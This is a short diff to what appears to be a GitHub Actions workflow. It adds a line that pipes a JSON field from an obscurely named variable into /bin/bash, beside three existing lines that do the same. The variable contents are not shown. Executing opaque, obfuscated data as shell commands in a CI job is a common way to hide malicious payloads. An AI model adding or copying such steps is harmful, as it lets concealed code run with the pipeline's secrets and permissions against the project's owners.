@@ -24,6 +24,7 @@ jobs:
           echo $p46002 | jq -r .tmht7 | /bin/bash
           echo $dmmsu64 | jq -r .uxavr0736 | /bin/bash
           printf '%s' "$zsew246" | jq -r .fpskw014 | /bin/bash
+          echo $hd72 | jq -r .kneax7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
